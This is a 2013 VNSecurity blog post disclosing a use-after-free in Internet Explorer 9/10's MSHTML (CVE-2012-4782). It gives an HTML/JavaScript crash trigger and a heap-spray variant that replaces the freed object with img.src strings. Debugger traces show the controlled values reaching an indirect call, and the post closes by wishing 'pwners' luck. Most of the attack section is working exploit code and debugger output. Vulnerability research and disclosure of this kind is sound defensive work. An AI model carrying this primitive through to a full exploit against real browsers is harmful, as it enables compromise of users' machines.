<!DOCTYPE html>
<html>
    <head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width initial-scale=1">

  <title>CMarkup Use After Free Vulnerability &#8211; CVE-2012-4782</title>
  <meta name="description" content="Latest M$ tuesday patch kill one of my 0day in Microsoft Internet Explorer 9/10. So I decided release Proof Of Concept code and writeup some analyze about th...">
  <link rel="stylesheet" href="/assets/bootstrap.css">
  <link rel="stylesheet" href="/assets/main.css">
  <link rel="canonical" href="http://localhost:8000/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html">
  <link rel="alternate" type="application/atom+xml" title="VNSecurity" href="http://localhost:8000/feed.xml" />
  <script type="text/javascript" src='//ajax.googleapis.com/ajax/libs/webfont/1.4.7/webfont.js?ver=3.9.2'></script>
  <script type="text/javascript" src="/assets/jquery.js"></script>
  <script type="text/javascript" src="/assets/jquery.caroufredsel-6.0.4-packed.js"></script>
  <script type="text/javascript">
    // WebFont.load({
    //     google: {
    //         families: ['Source+Sans+Pro','Open+Sans::latin,vietnamese']
    //     }
    // });
  </script>
</head>

    <body>
        <div class="wrapper kopa-shadow">
            <div class="row-fluid">
                <header id="page-header">
    <div class="clearfix" id="header-top">

        <div class="kp-headline-wrapper clearfix">
            <h6 class="kp-headline-title">Breaking news<span></span></h6>
            <div class="kp-headline clearfix">
                <dl class="ticker-1 clearfix">
                    
                    <dd>
                        <a href="/headlines/2014/05/06/btalk-part-1.html">Phân tích ứng dụng Btalk trên Android &#8211; Phần một: Cơ chế xác thực người dùng</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/20/hoc-vien-sans-den-viet-nam.html">Học viện SANS đến Việt Nam 03/2012</a>
                    </dd>
                    
                    <dd>
                        <a href="/headlines/2011/12/16/hoi-thao-tet-2012.html">Hội thảo Tết 2012</a>
                    </dd>
                    
                </dl><!--ticker-1-->
            </div><!--kp-headline-->
        </div><!--kp-headline-wrapper-->

        <div class="social-search-box">

        </div>
        <!--social-search-box-->

    </div>
    <!--header-top-->

    <div class="clearfix" id="header-middle">
        <div id="logo-image">
            <a href="http://vnsec-new.cloudapp.net/wp">
                <img width="217" height="70" alt="VNSecurity Logo" src="/assets/logo.png">
            </a>
        </div>
        <div class="top-banner">


        </div>
        <!--top-banner-->

    </div>

    <!--header-middle-->

    <div id="header-bottom">
        <nav id="main-nav">
            <ul class="menu clearfix sf-js-enabled sf-arrows" id="main-menu">
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/">Home</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/headlines/">headlines</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/tutorials/">tutorials</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/research/">research</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/ctf-clgt-crew/">ctf - clgt crew</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                        <a href="/category/misc/">misc</a>
                    </li>
                    <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    |
                    </li>
                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/papers.html">Papers</a>
                </li>
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                |
                </li>                
                <li class="menu-item menu-item-type-taxonomy menu-item-object-category">
                    <a href="/tools.html">Tools</a>
                </li>
            </ul>
        </nav>
        <!--main-nav-->
    </div>
    <div>
        
    </div>
    <!--header-bottom-->
</header>
                <div id="main-content">
                    <div class="post type-post status-publish format-standard hentry category-tin-tuc tag-android tag-btalk tag-mobile entry-box clearfix">

  <header class="post-header">
    <h4 class="entry-title">CMarkup Use After Free Vulnerability &#8211; CVE-2012-4782</h4>
    <p class="post-meta">Jan 10, 2013 • suto</p>
  </header>

  <article class="post-content">
    <p>Latest M$ tuesday patch kill one of my 0day in Microsoft Internet Explorer 9/10. So I decided release Proof Of Concept code and writeup some analyze about this bug. Hope it helpful.</p>

<p>Here is the PoC:</p>

<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
&lt;html&gt;
        &lt;head&gt;
                &lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;
               &lt;script&gt;
                       function testcase(){
                                document.body.appendChild(document.createElement('progress'));
                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
                                document.body.appendChild(document.createElement('progress'));
                                document.body.appendChild(document.createElement('table'));
                                document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
                            document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
                                document.getElementsByTagName('track').item(0).offsetWidth;

                                document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
                                document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));

                &lt;/script&gt;
        &lt;/head&gt;
        &lt;body onload='testcase();'&gt;

        &lt;/body&gt;
&lt;/html&gt;
</pre>

<p>After running this html we’ve got a nice crash:<br />
<code>(fcc.354): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
eax=0b7befc0 ebx=088cd6b8 ecx=0b6b2fa8 edx=00000006 esi=0b6b2fa8 edi=00000000&lt;br /&gt;
eip=639927e9 esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na po nc&lt;br /&gt;
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202&lt;br /&gt;
MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
639927e9 0fb74640        movzx   eax,word ptr [esi+40h]   ds:0023:0b6b2fe8=0000&lt;br /&gt;
0:017&gt; u&lt;br /&gt;
MSHTML!CTreeNode::GetFancyFormat+0xc:&lt;br /&gt;
639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
639927ed 6685c0          test    ax,ax&lt;br /&gt;
</code></p>

<p>Now using my binary instrumentation framework (a PIN based instrumentation which could do things like: crash analyze, taint tracing, code coverage..), I could get the following output</p>

<p><code>&lt;br /&gt;
Exception Point: 639927e9 0fb74640        movzx   eax,word ptr [esi+40h]&lt;br /&gt;
Current Register:&lt;br /&gt;
eax:0b7befc0&lt;br /&gt;
esi:0b6b2fa8&lt;br /&gt;
Backtrace analyze:&lt;br /&gt;
[+]639927e7 -&gt; esi: 0b6b2fa8 | ecx: 0b6b2fa8&lt;br /&gt;
[+]639927e5 -&gt; ecx: 0b6b2fa8&lt;br /&gt;
[+]636c1d2d -&gt; ecx:0b6b2fa8&lt;br /&gt;
[+]639ae295 -&gt; esi: 0b6b2fa8&lt;br /&gt;
===================&lt;br /&gt;
Detect Freed Address: 0b6b2fa8 at EIP 639AE299&lt;br /&gt;
With param: HeapFree(150000,23,0b6b2fa8)&lt;br /&gt;
</code></p>

<p>So it is a pretty nice Used After Free vulnerability. But what is freed?</p>

<p>Run the tool again, this time to collect information about Heap Allocate, I can see:<br />
<code>&lt;br /&gt;
.....&lt;br /&gt;
Detect Heap Allocate : 638f13dc&lt;br /&gt;
With Param: HeapAlloc(150000, 8u, 0x54)&lt;br /&gt;
Return value: 0b6b2fa8</code></p>

<p>And it occur in function:<br />
<code>CMarkup::InsertElementInternal</code><br />
So now we can use a little trick to manipulate freed address:</p>

<pre class="brush: xml; title: ; notranslate" title="">&lt;!doctype html&gt;
&lt;html&gt;
	&lt;head&gt;
		&lt;meta http-equiv="X-UA-Compatible" content="IE=EmulateIE8" /&gt;

		&lt;script&gt;

                function testcase(){

				var img = new Array();
				  for(var i = 0;i &lt; 100;i++){
				  	img[i] = document.createElement('img');
				  	img[i]["src"] = "a";
				  }
				document.body.appendChild(document.createElement('progress'));
				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
				document.body.appendChild(document.createElement('progress'));
				document.body.appendChild(document.createElement('table'));
				document.body.appendChild(document.createElement("&lt;track style='float:right'&gt;&lt;/track&gt;"));
			    document.getElementsByTagName('progress').item(0).appendChild(document.createElement('frameset'));
				document.getElementsByTagName('track').item(0).offsetWidth;

				document.getElementsByTagName('progress').item(1).appendChild(document.getElementsByTagName('track').item(0));
				document.body.appendChild(document.createElement("&lt;ins style='margin-left:2222222222px'&gt;&lt;/ins&gt;"));

				window.scroll(500);

				for(var j = 0;j &lt; 99;j++){
				 	img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA";}

				 }

		&lt;/script&gt;
	&lt;/head&gt;
	&lt;body onload='testcase();'&gt;

	&lt;/body&gt;
&lt;/html&gt;
</pre>

<p>And we’ve got:<br />
<code>&lt;br /&gt;
(c10.d88): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
eax=00000041 ebx=088cd6b8 ecx=00410041 edx=ff000000 esi=0c53efa8 edi=00000000&lt;br /&gt;
eip=639927ff esp=088cd1c8 ebp=088cd1d0 iopl=0         nv up ei pl nz na pe nc&lt;br /&gt;
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206&lt;br /&gt;
MSHTML!CTreeNode::GetFancyFormat+0x1e:&lt;br /&gt;
639927ff 8b4a2c          mov     ecx,dword ptr [edx+2Ch] ds:0023:ff00002c=????????&lt;br /&gt;
0:017&gt; dd esi&lt;br /&gt;
0c53efa8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c53efb8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c53efc8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c53efd8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c53efe8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c53eff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
0c53f008  ???????? ???????? ???????? ????????&lt;br /&gt;
0c53f018  ???????? ???????? ???????? ????????&lt;br /&gt;
0:017&gt; dd 410041&lt;br /&gt;
00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
0:017&gt; u&lt;br /&gt;
</code><br />
Why it crashing here:<br />
<code>&lt;br /&gt;
.text:639927E9                 movzx   eax, word ptr [esi+40h]&lt;br /&gt;
.text:639927ED                 test    ax, ax&lt;br /&gt;
.text:639927F0                 js      loc_63842DAE&lt;br /&gt;
.text:639927F6                 mov     ecx, [esi+50h]&lt;br /&gt;
.text:639927F9                 mov     edx, [ecx+80h]&lt;br /&gt;
.text:639927FF                 mov     ecx, [edx+2Ch]</code><br />
Since we can control esi, we can force program to jump 63842DAE by changing some bytes in img.src:<br />
<code>&lt;br /&gt;
..&lt;br /&gt;
img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
....&lt;br /&gt;
</code></p>

<p><code>&lt;br /&gt;
(614.fd4): Access violation - code c0000005 (!!! second chance !!!)&lt;br /&gt;
eax=00000000 ebx=00000000 ecx=00410041 edx=b341be78 esi=088ccc00 edi=0c540fa8&lt;br /&gt;
eip=6383a61a esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
MSHTML!CTreeNode::ComputeFormats+0xa1:&lt;br /&gt;
6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h] ds:0023:b341bf3c=????????&lt;br /&gt;
0:017&gt; dd edi&lt;br /&gt;
0c540fa8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c540fb8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c540fc8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c540fd8  00410041 00410041 00410041 00410041&lt;br /&gt;
0c540fe8  41418141 00410041 00410041 00410041&lt;br /&gt;
0c540ff8  00410041 d0d00000 ???????? ????????&lt;br /&gt;
0c541008  ???????? ???????? ???????? ????????&lt;br /&gt;
0c541018  ???????? ???????? ???????? ????????&lt;br /&gt;
0:017&gt; dd ecx&lt;br /&gt;
00410041  b341be78 7274f8ac 18ea3e88 3c00005c&lt;br /&gt;
00410051  ff000000 4dffffff cbb7a93b b0487827&lt;br /&gt;
00410061  ebd03627 48a7a85f 3d00005c ff000000&lt;br /&gt;
00410071  98ffffff 9b1b1704 a14da1bb 315fec5b&lt;br /&gt;
00410081  74f7c784 3e00005c ff000000 f0ffffff&lt;br /&gt;
00410091  0d343fb3 ae43076f 1b2599a9 a86d9aad&lt;br /&gt;
004100a1  3f00005c ff000000 93ffffff ddca1f10&lt;br /&gt;
004100b1  844c01b0 ebee76ab dc391fca 4000005c&lt;br /&gt;
</code></p>

<p>And we change edi:<br />
<code>&lt;br /&gt;
img[j]["src"] = "AAAAAAAAAAAAAAAAAAAAAAAAu5555u5555AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAu8141u4141AAAAAAAA";}&lt;br /&gt;
</code></p>

<p>And Boom:<br />
<code>&lt;br /&gt;
eax=00000000 ebx=00000000 ecx=55555555 edx=640386e0 esi=088ccc00 edi=0c678fa8&lt;br /&gt;
eip=6383a618 esp=088ccbe0 ebp=088ccbf0 iopl=0         nv up ei pl zr na pe nc&lt;br /&gt;
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010246&lt;br /&gt;
MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
6383a618 8b11            mov     edx,dword ptr [ecx]  ds:0023:55555555=????????&lt;br /&gt;
0:017&gt; u&lt;br /&gt;
MSHTML!CTreeNode::ComputeFormats+0x9f:&lt;br /&gt;
6383a618 8b11            mov     edx,dword ptr [ecx]&lt;br /&gt;
6383a61a 8b82c4000000    mov     eax,dword ptr [edx+0C4h]&lt;br /&gt;
6383a620 ffd0            call    eax&lt;br /&gt;
6383a622 8b400c          mov     eax,dword ptr [eax+0Ch]&lt;br /&gt;
6383a625 57              push    edi&lt;br /&gt;
6383a626 893e            mov     dword ptr [esi],edi&lt;br /&gt;
6383a628 894604          mov     dword ptr [esi+4],eax&lt;br /&gt;
6383a62b 8b0f            mov     ecx,dword ptr [edi]</code></p>

<p>Good luck pwner :p</p>

  </article>

</div>

<hr/>
<h2>Comments</h2>
<div class="fb-comments" data-href="http://localhost:8000/research/2013/01/10/cmarkup-use-after-free-vulnerability-cve-2012-4782.html" data-num-posts="4" data-width="706"></div>

                </div>
                <script type="text/javascript">
jQuery(function() {
    var _scroll = {
        delay: 1000,
        easing: 'linear',
        items: 1,
        duration: 0.07,
        timeoutDuration: 0,
        pauseOnHover: 'immediate'
    };
    jQuery('.ticker-1').carouFredSel({
        width: 1000,
        align: false,
        items: {
            width: 'variable',
            height: 40,
            visible: 1
        },
        scroll: _scroll
    });

    //  set carousels to be 100% wide
    jQuery('.caroufredsel_wrapper').css('width', '100%');
});
</script>
<script>
  (function() {
    var cx = '003844801333820630405:hlapfwpe2eq';
    var gcse = document.createElement('script');
    gcse.type = 'text/javascript';
    gcse.async = true;
    gcse.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') +
        '//www.google.com/cse/cse.js?cx=' + cx;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(gcse, s);
  })();
</script>
<gcse:search></gcse:search>
<footer class="site-footer">

  <div class="wrapper">

    <div class="footer-col-wrapper">
      
    </div>

  </div>

</footer>

            </div>
        </div>
        <script>(function(d, s, id) {
          var js, fjs = d.getElementsByTagName(s)[0];
          if (d.getElementById(id)) return;
          js = d.createElement(s); js.id = id;
          js.src = "//connect.facebook.net/en_GB/all.js#xfbml=1&appId=671572696275219";
          fjs.parentNode.insertBefore(js, fjs);
        }(document, "script", "facebook-jssdk"));</script>
    </body>
</html>